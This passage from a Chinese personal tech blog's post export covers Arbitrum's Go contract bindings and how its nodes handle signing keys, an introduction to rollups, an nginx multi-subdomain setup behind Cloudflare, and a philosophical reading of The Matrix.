*ChallengeManagerTransactor) OneStepProveExecution(opts *bind.TransactOpts, challengeIndex uint64, selection ChallengeLibSegmentSelection, proof []byte) (*types.Transaction, error) { return _ChallengeManager.contract.Transact(opts, &quot;oneStepProveExecution&quot;, challengeIndex, selection, proof) } 其中关键在与这里的opts,如果我们继续进到这个Transact方法里面会发现，链上的信息都是由这里的opts获取的，用户签名接口，用户信息等 那么对于一个合约调用就分为两部分，一是调用参数，也就是这里的opts和合约参数，一是对接一台的的client 参数进入到这里的opts,这是以太坊里面的数据结构 // valid Ethereum transaction. type TransactOpts struct { From common.Address // Ethereum account to send the transaction from Nonce *big.Int // Nonce to use for the transaction execution (nil = use pending state) Signer SignerFn // Method to use for signing the transaction (mandatory) Value *big.Int // Funds to transfer along the transaction (nil = 0 = no funds) GasPrice *big.Int // Gas price to use for the transaction execution (nil = gas price oracle) GasFeeCap *big.Int // Gas fee cap to use for the 1559 transaction execution (nil = gas price oracle) GasTipCap *big.Int // Gas priority fee cap to use for the 1559 transaction execution (nil = gas price oracle) GasLimit uint64 // Gas limit to set for the transaction execution (0 = estimate) GasMargin uint64 // Arbitrum: adjusts gas estimate by this many basis points (0 = no adjustment) Context context.Context // Network context to support cancellation and timeouts (nil = no timeout) NoSend bool // Do all transact steps but do not send the transaction } 我们可以看到，这里包含用户信息的签名数据 对于链下的开发者，我们需要构造这个结构，来调用方法 client我们有链合约的调用参数，那么就需要有一个client来为我们发送交易，（虽然构造交易的时候也用到链client,但这都是已经被工具封装好的，开发者没必要细究它是怎么构建的） 实际上client是在我们构建合约对象时构建的 // NewChallengeManager creates a new instance of ChallengeManager, bound to a specific deployed contract. func NewChallengeManager(address common.Address, backend bind.ContractBackend) (*ChallengeManager, error) { contract, err := bindChallengeManager(address, backend, backend, backend) if err != nil { return nil, err } return &amp;ChallengeManager{ChallengeManagerCaller: ChallengeManagerCaller{contract: contract}, ChallengeManagerTransactor: ChallengeManagerTransactor{contract: contract}, ChallengeManagerFilterer: ChallengeManagerFilterer{contract: contract}}, nil } 在构建ChallengeManger这个合约对象时，我们需要给他一个backend,这里的backend就是链的client,地址也就是链上的合约地址 可以看到backend也是bind这个包里面的，实际上它也是以太坊源码里面的包 type ContractBackend interface { ContractCaller ContractTransactor ContractFilterer } type ContractCaller interface { // CodeAt returns the code of the given account. This is needed to differentiate // between contract internal errors and the local chain being out of sync. CodeAt(ctx context.Context, contract common.Address, blockNumber *big.Int) ([]byte, error) // CallContract executes an Ethereum contract call with the specified data as the // input. CallContract(ctx context.Context, call ethereum.CallMsg, blockNumber *big.Int) ([]byte, error) } type ContractTransactor interface { ethereum.GasEstimator ethereum.GasPricer ethereum.GasPricer1559 ethereum.TransactionSender // HeaderByNumber returns a block header from the current canonical chain. If // number is nil, the latest known header is returned. HeaderByNumber(ctx context.Context, number *big.Int) (*types.Header, error) // PendingCodeAt returns the code of the given account in the pending state. PendingCodeAt(ctx context.Context, account common.Address) ([]byte, error) // PendingNonceAt retrieves the current pending nonce associated with an account. PendingNonceAt(ctx context.Context, account common.Address) (uint64, error) } type ContractFilterer interface { ethereum.LogFilterer } 这个client看起来构造很麻烦，实际上也是有迹可循的，这里面都是以太坊里的数据结构，所以理论上以太坊里面已经有对象实现了这些接口 type Client struct { c rpc.ClientInterface } type ClientInterface interface { CallContext(ctx_in context.Context, result interface{}, method string, args ...interface{}) error EthSubscribe(ctx context.Context, channel interface{}, args ...interface{}) (*ClientSubscription, error) BatchCallContext(ctx context.Context, b []BatchElem) error Close() } // Client represents a connection to an RPC server. type Client struct { idgen func() ID // for subscriptions isHTTP bool // connection type: http, ws or ipc services *serviceRegistry idCounter atomic.Uint32 // This function, if non-nil, is called when the connection is lost. reconnectFunc reconnectFunc // config fields batchItemLimit int batchResponseMaxSize int // writeConn is used for writing to the connection on the caller&#39;s goroutine. It should // only be accessed outside of dispatch, with the write lock held. The write lock is // taken by sending on reqInit and released by sending on reqSent. writeConn jsonWriter // for dispatch close chan struct{} closing chan struct{} // closed when client is quitting didClose chan struct{} // closed when client quits reconnected chan ServerCodec // where write/reconnect sends the new connection readOp chan readOp // read messages readErr chan error // errors from read reqInit chan *requestOp // register response IDs, takes write lock reqSent chan error // signals write completion, releases write lock reqTimeout chan *requestOp // removes response IDs when call timeout expires }","categories":[{"name":"区块链","slug":"区块链","permalink":"https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"},{"name":"以太坊","slug":"区块链/以太坊","permalink":"https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"}],"tags":[{"name":"以太坊","slug":"以太坊","permalink":"https://bighu630.github.io/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"},{"name":"arbitrum","slug":"arbitrum","permalink":"https://bighu630.github.io/tags/arbitrum/"},{"name":"L2","slug":"L2","permalink":"https://bighu630.github.io/tags/L2/"}],"author":"ivhu"},{"title":"以太坊Rollup方案之 arbitrum（1）","slug":"以太坊Rollup方案之-arbitrum（1）","date":"2024-09-10T12:56:05.000Z","updated":"2026-02-27T03:14:28.900Z","comments":true,"path":"2024/09/10/以太坊Rollup方案之-arbitrum（1）/","permalink":"https://bighu630.github.io/2024/09/10/%E4%BB%A5%E5%A4%AA%E5%9D%8ARollup%E6%96%B9%E6%A1%88%E4%B9%8B-arbitrum%EF%BC%881%EF%BC%89/","excerpt":"","text":"这篇文章深入探讨了Rollup的概念及其在以太坊扩容中的作用，特别是Arbitrum的实现方式。Rollup作为Layer 2扩容解决方案，通过将交易数据汇总到独立的Rollup链中，减轻了以太坊主链的负担。文章对两种主要的Rollup类型进行了对比：Optimistic Rollup（如Arbitrum）和ZK Rollup，分别介绍了它们在交易验证上的不同方法。 什么是Rollup？ 以太坊的Rollup扩容是一种Layer 2（第二层）扩容解决方案，旨在提高以太坊区块链的交易吞吐量和性能。它通过将大量的交易数据转移到以太坊区块链之外的第二层网络来实现这一目标。 Rollup的核心思想是将交易数据汇总到k个称为Rollup链的智能合约中，然后将这些汇总数据提交到以太坊主链上进行验证。这样做的好处是，Rollup链可以处理大量的交易，并将结果提交到以太坊主链上进行最终的验证和确认，从而减轻了主链的负担。 目前有两种主流的rollup,一种是arbitrum所属的op rollup（乐观rollup，下面简称op），一种是zk rollup（基于零知识证明的rollup,下面简称zk）.这两者的区别主要在于以太坊验证rollup交易的方式不同。 对于 op rollup,它的原型是 – 我们默认的认为在L2上发生的交易是没问题，在默认情况下，以太坊不验证rollup的交易。当然，这里只是以太坊不验证，op方案存在链下的验证人，所以op 的交易一般都有一个供验证者验证的窗口期。 而zk rollup则与之相反，zk悲观的认为L2上的每一笔交易都是不可信的，每一笔交易都必须在以太坊原链上验证。而零知识证明在这里的作用就是，减少验证过程中的gas消耗。比如我们在L2上有一个合约执行的交易，如果L1需要验证L2的交易，我们不能把交易再放到L1上执行一次（一方面这会有很多L1,L2上的映射问题，另一方面，如果验证的时候需要再执行一遍，那我为什么不直接在L1上执行）。零知识证明做到的就是，我们在L2上做了一个复杂的操作（例如一个合约执行），我们可以为这个操作生成一个零知识证明（这里给出我的一个猜测，例如L2为一个提现操作生成了一个零知识证明 p,将p发送至L1,L1上的合约存在验证逻辑，他可以验证当且仅当L2上确实发生了对应的销毁操作，这个证明才可能被构造出来），L1上只需要验证这个证明。 在正式开始之前需要先澄清一点：rollup并不是去执行L1上的交易，你不可能在L2上执行一个L1的合约，L2是独立于L1而存在的（在数据上来看），L2不主动拥有L1上的任何数据，他只是借用L1提供的去信任机制，L2将自己的数据，高度压缩&#x2F;转换为Kz然后保存在L1上，实际上L1完全看不懂L2传过来的数据是什么意思，而他将数据保存在L1上是为了证明，在任何时候，你都可以通过L1上的这些数据还原L2的状态，从而来确保L2上数据的去信任化。 aribtrum介绍aribtrum结构那么我们回到arbitrum的 op rollup，我们先看一下arbitrum的整体架构图： 我们将aribtrum分成三个（四个）部分。第一部分是两个红色框里面的 排序器 sequencer，第二部分是绿色框中的 验证者 validator，第三部分是在L1中的蓝色框里面的rollup 合约，以及第四部分没有画框的资产桥（资产桥不影响aribtrum的主要逻辑，可以看作是aribtrum的增值服务，不过对于公链，资产桥是核心业务) 先来看一下排序器： 排序器的主要功能是将L2上的大量交易排序并打包，发送至L1里面的 sequencer inbox 合约（airbitum称之为快箱） 排序器主要对接用户的请求，接受用户请求，排序，执行，返回结果，排序起中一批交易一般会在0-2s内被执行（aribtrum逻辑与以太坊相似，这里的执行实际上是落快，但是排序器落快不代表最终结果，他只是因为基于以太坊，所以才有落块这个操作，实际上后面会谈到的Rblock更加贴近区块链的概念），并迅速返回结果给用户，响应速度几乎匹及web2平台。 排序器会周期性的向L2上的其他节点广播区块。另外，排序器通常会每隔几分种将这段时间内收集到的区块进行一个压缩（使用谷歌的一个压缩率还可以的算法做的压缩，这里的压缩的唯一目的是减少L1上的gas消耗）打包成一个batch保存在sequencerInbox合约中。 从以上流程中我们可以概括：Layer2 有自己的节点网络，但这些节点数量稀少，且一般没有公链惯用的共识协议，所以安全性是很差的，必须要依附于以太坊来保证，数据发布的可靠性与状态转换的有效性。 排序器实际上不参与rollup的过程，他是一个快速执行交易，打包的工具，实际上arbitrum可以不依靠排序起执行，用户可以直接把交易发送给rebitrun one 节点。 Arbitrum Rollup 协议：定义 Rollup 链的区块 RBlock 的结构，链的延续方式，RBlock 的发布，以及挑战模式流程等⼀系列的合约。注意，这里说的 Rollup 链并不是大家理解的 Layer2 账本，而是 Arbitrum One 为了施展欺诈证明机制，而独立设置的一条抽象出来的「链状数据结构」。 ⼀个 RBlock 可以包含多个 L2 区块的结果，⽽且数据也迥异，它的数据实体 RBlock 存储在 RollupCore 的⼀系列合约中。如果⼀个 RBlock 存在问题，Validator 将⾯向该 RBlock 的提交者对其进⾏挑战。 验证者 validatorArbitrum 的验证者节点其实是 Layer2 全节点的特殊子集，目前有白名单准入。 validator是arbitrum中产生rbolck的主体，验证者节点会监听链上的dequencerInbox合约，下载排序器打包的batch来创建Rblock.同时监听以太坊上的rollup合约，验证其他节点提交的rblock,向异常rblock发起挑战。 挑战：基础步骤可以概括为多轮互动式细分、单步证明。在细分环节，挑战双⽅先对有问题的交易数据进行多轮回合制细分，直至分解出有问题的那⼀步操作码指令，并进行验证。「多轮细分-单步证明」这种范式，被 Arbitrum 开发者认为是欺诈证明中最节省 gas 的实现方式。所有环节都在合约控制之下，没有⼀方可以作弊。 挑战期：由于 OP Rollup 的乐观 optimistic 本质，每个 RBlock 提交上链后，合约并不主动检查，预留给验证者一段时间窗抠期去证伪。此时间窗口即为挑战期，在 Arbitrum One 主网上为 1 周。挑战期结束后，该 RBlock 才会被最终确认，块内对应的从 L2 传递到 L1 的消息（比如通过官方桥执行的提款操作）才能被放行。 挑战的原理等后面讲ArbOs的WAVM时一起讲 L2交易的生命周期 用户向排序器发送交易指令。 排序器先对待处理交易进数字签名等数据的验证，剔除无效交易，并进行排序和运算。 排序器将交易回执发送给⽤户（通常都⾮常快），但这只是排序器在 ETH 链下进行的「预处理」，处于 Soft Finality 的状态，并不可靠。但对于信任排序器的⽤户（大部分用户），可以乐观的认为交易已经完成，不会被回滚。 排序器将预处理后的交易原始数据，⾼度压缩后封装为⼀个 Batch（批次）。 **每隔⼀段时间（受到数据量、ETH 拥堵程度等因素影响），排序器会向 L1 上的 Sequencer Inbox 合约发布交易 Batch。**此时可认为，交易已拥有最终性 Hard Finality。 未完待续","categories":[{"name":"区块链","slug":"区块链","permalink":"https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"},{"name":"二层","slug":"区块链/二层","permalink":"https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/%E4%BA%8C%E5%B1%82/"}],"tags":[{"name":"以太坊","slug":"以太坊","permalink":"https://bighu630.github.io/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"},{"name":"arbitrum","slug":"arbitrum","permalink":"https://bighu630.github.io/tags/arbitrum/"},{"name":"L2","slug":"L2","permalink":"https://bighu630.github.io/tags/L2/"}],"author":"ivhu"},{"title":"区块链应用的密钥管理","slug":"区块链应用的密钥管理","date":"2024-09-09T08:26:54.000Z","updated":"2026-02-27T03:14:28.900Z","comments":true,"path":"2024/09/09/区块链应用的密钥管理/","permalink":"https://bighu630.github.io/2024/09/09/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%BA%94%E7%94%A8%E7%9A%84%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86/","excerpt":"","text":"这篇文章探讨了区块链应用中密钥管理的重要性，特别是在持续向区块链发送交易的场景下，如Arbitrum的Sequencer和Chainlink的数据馈送，强调了安全使用和管理私钥的方法，包括通过配置文件和文件密钥，同时分析了密钥的安全等级以及如何在程序中有效保护密钥，最后以Arbitrum的具体实现为例，详细阐述了密钥的生成、使用和存储过程。 管理什么密钥？在区块链应用的基础组件中通常有这样一种功能，需要持续不断的向区块链中发送交易，比如arbitrum的Sequencer需要持续不断的发送L2的区块，stark 需要发送单步证明&#x2F;rBlock发布 的交易，chainlink需要定时发送datafeed交易。而这每一笔交易都需要L1上的账户做签名，如何安全的使用和管理这个密钥是值得关心的。 结论就我所看到的一般有两种方式： 通过配置文件配置私钥 使用filekey的方式： 注意file一般需要一个密码，密码是启动后在终端控制台输入 当然，密钥管理不只是简单的将密钥注入到程序里面，而是如何在程序里面安全的使用这些密钥，毕竟如果密钥发在一个可能被外部接口调用的接口中，可能会降低密钥的安全性。 密钥安全等级（依次递减，只考虑加密算法公开的情况）： 黑客无法得知任何明文&amp;密文 黑客可以得到密文 黑客可以得到密文对应的明文 黑客可以自行构造明文产生密文 所以在程序中也需要对密钥进行保护。 以太坊中每次使用完私钥会将私钥的地址还原成0地址，就是为了避免私钥在内存中泄漏。 私钥泄漏的原理大致是，geth程序在使用完内存后会释放内存，而他释放内存并不会把内存值全部置0,只是告诉操作系统，“这段内存我不用了，你可以分配给别的程序” 。而别的程序申请到这段内存之后，他是可以直接读取这段内存里的值，（经典案例就是 在c语言中如果你初始化一个变量，而不为赋值，那他的值不是0值，而是原先在这个内存里的值） arbitrum的处理方案先从最底层的调用开始看 在单步证明的调用中可以看到，这笔交易的用户信息是保存在auth字段中的 func (m *ChallengeManager) IssueOneStepProof( ctx context.Context, oldState *ChallengeState, startSegment int, ) (*types.Transaction, error) { position := oldState.Segments[startSegment].Position proof, err := m.executionChallengeBackend.GetProofAt(ctx, position) if err != nil { return nil, fmt.Errorf(&quot;error getting OSP from challenge %v backend at step %v: %w&quot;, m.challengeIndex, position, err) } return m.challengeCore.con.OneStepProveExecution( m.challengeCore.auth, // 用户信息保存在这个字段 m.challengeCore.challengeIndex, challengegen.ChallengeLibSegmentSelection{ OldSegmentsStart: oldState.Start, OldSegmentsLength: new(big.Int).Sub(oldState.End, oldState.Start), OldSegments: oldState.RawSegments, ChallengePosition: big.NewInt(int64(startSegment)), }, proof, ) } 具体如何使用可以继续点进去看，最终是auth中包含一个变量（函数类型的变量），由这个变量进行签名，（我们需要找到的这个函数的生命周期，也就是密钥的生命周期）。 那么继续往上看，看这个challengeManager的构造方法 func NewChallengeManager( ctx context.Context, l1client bind.ContractBackend, auth *bind.TransactOpts, fromAddr common.Address, challengeManagerAddr common.Address, challengeIndex uint64, val *StatelessBlockValidator, startL1Block uint64, confirmationBlocks int64, ) (*ChallengeManager, error) { ... return &amp;ChallengeManager{ challengeCore: &amp;challengeCore{ con: con, challengeManagerAddr: challengeManagerAddr, challengeIndex: challengeIndex, client: l1client, auth: auth, // 也就是上面的auth actingAs: fromAddr, startL1Block: new(big.Int).SetUint64(startL1Block), confirmationBlocks: confirmationBlocks, }, blockChallengeBackend: backend, validator: val, wasmModuleRoot: challengeInfo.WasmModuleRoot, maxBatchesRead: challengeInfo.MaxInboxMessages, }, nil } 可以看到auth是上面传递过来的bind.ContractOpts 继续往上面看,auth来自与Builder这个结构，好在这个结构的构造函数只被调用过一次（我们及假设唯一的构造得到的auth就是我们要找的auth，中间没有发生更改） func NewBuilder(wallet ValidatorWalletInterface) (*Builder, error) { randKey, err := crypto.GenerateKey() if err != nil { return nil, err } builderAuth := wallet.AuthIfEoa() var isAuthFake bool if builderAuth == nil { // Make a fake auth so we have txs to give to the smart contract wallet builderAuth, err = bind.NewKeyedTransactorWithChainID(randKey, big.NewInt(9999999)) if err != nil { return nil, err } isAuthFake = true } return &amp;Builder{ builderAuth: builderAuth, wallet: wallet, L1Interface: wallet.L1Client(), isAuthFake: isAuthFake, }, nil } builder的auth有两种途径，一种是 AuthIfEoa 也就是从eoa中解析私钥，一种是自己生成私钥 那么关键在与这里的wallet是什么（也就是现在从跟踪auth转移到跟踪wallet） 最终发现wallet在creatNoteImpl方法里面构造的 var wallet staker.ValidatorWalletInterface = validatorwallet.NewNoOp(l1client, deployInfo.Rollup) if !strings.EqualFold(config.Staker.Strategy, &quot;watchtower&quot;) { if config.Staker.UseSmartContractWallet || (txOptsValidator == nil &amp;&amp; config.Staker.DataPoster.ExternalSigner.URL == &quot;&quot;) {// 合约账户 var existingWalletAddress *common.Address if len(config.Staker.ContractWalletAddress) &gt; 0 { if !common.IsHexAddress(config.Staker.ContractWalletAddress) { log.Error(&quot;invalid validator smart contract wallet&quot;, &quot;addr&quot;, config.Staker.ContractWalletAddress) return nil, errors.New(&quot;invalid validator smart contract wallet address&quot;) } tmpAddress := common.HexToAddress(config.Staker.ContractWalletAddress) existingWalletAddress = &amp;tmpAddress } wallet, err = validatorwallet.NewContract(dp, existingWalletAddress, deployInfo.ValidatorWalletCreator, deployInfo.Rollup, l1Reader, txOptsValidator, int64(deployInfo.DeployedAt), func(common.Address) {}, getExtraGas) if err != nil { return nil, err } } else { if len(config.Staker.ContractWalletAddress) &gt; 0 { return nil, errors.New(&quot;validator contract wallet specified but flag to use a smart contract wallet was not specified&quot;) } wallet, err = validatorwallet.NewEOA(dp, deployInfo.Rollup, l1client, getExtraGas) if err != nil { return nil, err } } } 继续跟踪我们得到wellet中的验证方法是由txOptsValidator提供的 向上继续找txOptsValidator 最重找到mainImpl if sequencerNeedsKey || nodeConfig.Node.BatchPoster.ParentChainWallet.OnlyCreateKey { l1TransactionOptsBatchPoster, dataSigner, err = util.OpenWallet(&quot;l1-batch-poster&quot;, &amp;nodeConfig.Node.BatchPoster.ParentChainWallet, new(big.Int).SetUint64(nodeConfig.ParentChain.ID)) if err != nil { flag.Usage() log.Crit(&quot;error opening Batch poster parent chain wallet&quot;, &quot;path&quot;, nodeConfig.Node.BatchPoster.ParentChainWallet.Pathname, &quot;account&quot;, nodeConfig.Node.BatchPoster.ParentChainWallet.Account, &quot;err&quot;, err) } if nodeConfig.Node.BatchPoster.ParentChainWallet.OnlyCreateKey { return 0 } } if validatorNeedsKey || nodeConfig.Node.Staker.ParentChainWallet.OnlyCreateKey { l1TransactionOptsValidator, _, err = util.OpenWallet(&quot;l1-validator&quot;, &amp;nodeConfig.Node.Staker.ParentChainWallet, new(big.Int).SetUint64(nodeConfig.ParentChain.ID)) if err != nil { flag.Usage() log.Crit(&quot;error opening Validator parent chain wallet&quot;, &quot;path&quot;, nodeConfig.Node.Staker.ParentChainWallet.Pathname, &quot;account&quot;, nodeConfig.Node.Staker.ParentChainWallet.Account, &quot;err&quot;, err) } if nodeConfig.Node.Staker.ParentChainWallet.OnlyCreateKey { return 0 } } 我们得到l1TransactionOptsValidator是使用nodeConfig.Node.Staker.ParentChainWallet 这个配置项得到的. 最终的数据结构张这个样子 type WalletConfig struct { Pathname string `koanf:&quot;pathname&quot;` Password string `koanf:&quot;password&quot;` PrivateKey string `koanf:&quot;private-key&quot;` Account string `koanf:&quot;account&quot;` OnlyCreateKey bool `koanf:&quot;only-create-key&quot;` } 继续点到OpenWallet可以看到他是如何处理这些配置项的 在有私钥的情况下最终会走到这个方法 func NewKeyedTransactorWithChainID(key *ecdsa.PrivateKey, chainID *big.Int) (*TransactOpts, error) { keyAddr := crypto.PubkeyToAddress(key.PublicKey) if chainID == nil { return nil, ErrNoChainID } signer := types.LatestSignerForChainID(chainID) return &amp;TransactOpts{ From: keyAddr, Signer: func(address common.Address, tx *types.Transaction) (*types.Transaction, error) { // signer就是我们一直再找的在发送交易时使用到的签名方法 if address != keyAddr { return nil, ErrNotAuthorized } signature, err := crypto.Sign(signer.Hash(tx).Bytes(), key) if err != nil { return nil, err } return tx.WithSignature(signer, signature) }, Context: context.Background(), }, nil } 从这里看出来，私钥始终保存在signer这个方法中，在整个使用过程中没有将私钥作为参数传递的情况。 如果使用的是filekey+密码的情况会进入到这个方法 func NewKeyStoreTransactorWithChainID(keystore *keystore.KeyStore, account accounts.Account, chainID *big.Int) (*TransactOpts, error) { if chainID == nil { return nil, ErrNoChainID } signer := types.LatestSignerForChainID(chainID) return &amp;TransactOpts{ From: account.Address, Signer: func(address common.Address, tx *types.Transaction) (*types.Transaction, error) { if address != account.Address { return nil, ErrNotAuthorized } signature, err := keystore.SignHash(account, signer.Hash(tx).Bytes()) if err != nil { return nil, err } return tx.WithSignature(signer, signature) }, Context: context.Background(), }, nil } 程序会根据filekey构造一个keystore,后续签名都是在keystore中签名 注意filekey的密码是在终端控制台输入的,其中的readPass函数如下 func readPass() (string, error) { bytePassword, err := term.ReadPassword(syscall.Stdin) if err != nil { return &quot;&quot;, err } passphrase := string(bytePassword) passphrase = strings.TrimSpace(passphrase) return passphrase, nil }","categories":[{"name":"区块链","slug":"区块链","permalink":"https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"},{"name":"以太坊","slug":"区块链/以太坊","permalink":"https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"}],"tags":[{"name":"arbitrum","slug":"arbitrum","permalink":"https://bighu630.github.io/tags/arbitrum/"},{"name":"区块链","slug":"区块链","permalink":"https://bighu630.github.io/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"},{"name":"密钥管理","slug":"密钥管理","permalink":"https://bighu630.github.io/tags/%E5%AF%86%E9%92%A5%E7%AE%A1%E7%90%86/"}],"author":"ivhu"},{"title":"nginx一个端口服务多个网页（带cdn)","slug":"nginx-cf反向代理多个网页","date":"2024-09-06T07:48:05.000Z","updated":"2026-02-27T03:14:28.899Z","comments":true,"path":"2024/09/06/nginx-cf反向代理多个网页/","permalink":"https://bighu630.github.io/2024/09/06/nginx-cf%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E5%A4%9A%E4%B8%AA%E7%BD%91%E9%A1%B5/","excerpt":"","text":"这篇博客介绍了如何使用Cloudflare和Nginx，在同一服务器的443端口上托管多个服务。通过为不同子域名配置Nginx反向代理，将请求路由到不同的本地服务，并使用Cloudflare的SSL证书和CDN加速访问。 缘起大学的时候买了一个阿里云的小鸡，一直续费在现在，上面跑了不少服务（trilium note,worldpress,calibre），但是服务器的网速非常低。 最近听说cdn的加速功能，先尝尝能不能给我的服务器提点速。 **如果不喜欢听故事 直接跳转到 nginx反向代理多个域名 ** 在此之前我的配置很早的时候我还不会给网站加https,我的服务在公网上以http跑了两年多，后面是在忍不了，给服务器买了个域名（以前一直没域名，用ip访问😀）然后开启了我的https配置之旅. 其中最恶心的是worldpress。我的worldpress是用docker搭建的，worldpress的ssl实现是用apatch做的，它在docker里面跑了一个apatch，我去容器里面给他配了一个apatch🤮 有了域名之后，我的三个服务以不同的端口跑在我的服务器上，访问的时候都是带着端口访问的（当然我是认为没什么问题，就是不那么好看） 第一次尝试两个月前其实就尝试过给网站套cf的cdn,但是一直没成功（因为我用的不是443端口），无论我怎么尝试，套了cdn之后就一直是http能访问，https访问的时候会之际把我的端口抹除，没有s我怎么忍得了，所以第一次尝试失败了 nginx反向代理多个域名为了使我的三个服务都用443端口，然后在用cdn对443端口进行加速 把域名交给cf托管这里我就不教cf怎么托管域名，网上都有托管了之后，我们可以在cf里面添加域名解析那么我分别为我的三个域名申请了3个域名 blog.domain.com note.domain.com lib.domain.com 这三个域名解析的地址都是我服务器的地址 以上只是举例 注意点亮右边的小彩云（表示开启cf的cdn加速) 写nginx的配置文件nginx怎么运做的我这里就不介绍了（不会的可以搜索一下nginx的配置文件怎么写，写好了放那儿，怎么开启nginx,怎么重载nginx的配置文件） 这里给出gpt给我的配置文件 # 第一个网站的配置，代理到 localhost:3001 # 假设我的3001是图书馆的服务地址 server { listen 443 ssl; server_name lib.domain.com; # 图书观的域名 # SSL 证书 ssl_certificate /etc/nginx/ssl/example1.com.crt; ssl_certificate_key /etc/nginx/ssl/example1.com.key; location / { proxy_pass http://localhost:3001; # 代理到本地的 3001 端口 proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; } } # 第二个网站的配置，代理到 localhost:3002 # 假设是我的博客 server { listen 443 ssl; server_name blog.domain.com; # SSL 证书 ssl_certificate /etc/nginx/ssl/example2.com.crt; ssl_certificate_key /etc/nginx/ssl/example2.com.key; location / { proxy_pass http://localhost:3002; # 代理到本地的 3002 端口 proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; } } 关于上面的配置正常情况没有多少要修改的 server_name: 这里写你在cf上申请的域名 ssl_certificate: 证书的路径,一般情况你需要去购买证书，但是使用cf做cdn 你可以使用cf中的证书（也可以自己生成证书，只需要把cf里面的ssl安全等级开到完全如下图） 使用cf中的证书: 在这个页面为你的域名申请证书(如果不懂就老老实实用完全模式 或者自己买证书) proxy_pass: 这里填我们真正服务的地址 这时我们访问lib.domain.com 就会被nginx路由到 http://localhost:3001 上 访问 blog.domain.com 就会被nginx路由到 http://localhost:3002 上 缘散至此，在同一个服务器的443端口开启了多个网页，但是在访问的时候我们用的是不同的域名","categories":[{"name":"计算机","slug":"计算机","permalink":"https://bighu630.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"},{"name":"运维","slug":"计算机/运维","permalink":"https://bighu630.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/%E8%BF%90%E7%BB%B4/"}],"tags":[{"name":"cloudflare","slug":"cloudflare","permalink":"https://bighu630.github.io/tags/cloudflare/"},{"name":"nginx","slug":"nginx","permalink":"https://bighu630.github.io/tags/nginx/"}],"author":"ivhu"},{"title":"黑客帝国中的形而上学","slug":"黑客帝国中的形而上学","date":"2024-09-03T12:27:00.000Z","updated":"2026-02-27T03:14:28.901Z","comments":true,"path":"2024/09/03/黑客帝国中的形而上学/","permalink":"https://bighu630.github.io/2024/09/03/%E9%BB%91%E5%AE%A2%E5%B8%9D%E5%9B%BD%E4%B8%AD%E7%9A%84%E5%BD%A2%E8%80%8C%E4%B8%8A%E5%AD%A6/","excerpt":"","text":"这篇文章深入探讨了《黑客帝国》中的哲学核心，特别是通过对主要角色Neo、先知和老先生的分析，揭示了电影中的复杂世界观。文章探讨了Neo作为“程序中的变数”，如何象征着自由意志在一个被控制的系统中的存在与挣扎。同时，文章通过形而上学的视角，探讨了先知对未来的预知与个体自由意志之间的矛盾，进一步引发了对自我认知和现实层次的思考。这是一篇关于《黑客帝国》哲学内核的深度解读，探索了自由意志、宿命论以及个体在系统中的定位。 首先，黑客帝国不可否认是一部优秀的电影，不只是他的精神内核,他的艺术表现形式也是值得称赞的。 本期我将着重于黑客帝国的精神内核来履清黑客帝国究竟是讲的什么。 我将会怎么解读？这是黑客帝国中很有意思的一个问题（男主问先知：我将会问你什么？） 那么这个问题的答案是：黑客帝国中的两个（或者三个）关键人物。neo，先知，和创建矩阵的老先生。并且关键不是他们的目的，动机。而是：他是谁（什么）。 那么，我们首先来看一些第二季的最后，neo打开了那扇关键的门，在门里面遇到了世界的创建者。neo问到：我是谁。这时老先生给出了世界观的关键信息。 neo是谁？老先生说：你是我创造出来的一系列问题（一系列bug），我不知道你是谁，但你来到这里，我就知道你是那一系列bug的组合。 正常而言 先知会解决你（解决这个bug），但是你能找到这儿来说明先知没有解决你。 接着老先生又说在最开始的几个版本中，本来没有你（指bug），但是没有你（各种意外）的世界，活不到现代，后面他在矩阵中创建了意外，而先知则会修复意外，使得“现实”不至于分崩离析.先知会告诉你一切（除非你是你，亦或者你是先知的意外） 由上面的话，我们带入一点程序的思路（这是这个故事有意思的地方，包括第二部里面neo和黑衣人打群架，其实neo大概率不会累，他在里面只是一个程序）。老先生创建了这个世界，为了让世界得以存活，所以为这世界保留了“意外”，也就是程序中存在一定的随机量，但是他创建了先知，来修复这个随机量。即对于程序执行，存在一定几率不合逻辑，但是如果你问先知，他说的一定会发生。那么首先我们思考一下没有意外的世界是什么样的，用极限来讲，你可以随时随地问先知，那么你实际上什么都不会做，你只会问先知，这是世界自然不会发展。而存在意外量的情况则是，你依然保留你的随即数，但当你问先知，那么答案就一定是确定的（先知是个老人，回答不了太多人，也就是有访问限制）。那么这就有一个很有意思的问题。 在矩阵中自由意识存在吗？ 什么是自由意识？在存在先知的世界中，自由意识存在吗？在先知眼里，自由意识不存在，因为无论是什么问题，只要你问先知，他的回答就是包含你以为的自由意志作用之后的答案。比如，你问今晚12点之前我可以睡着吗，那么先知的回答这是包含了在你听到答案之后自由意志作祟但是依然无法改变的结果，那么对于先知而言自由意志只是一个他意料之中的参数。 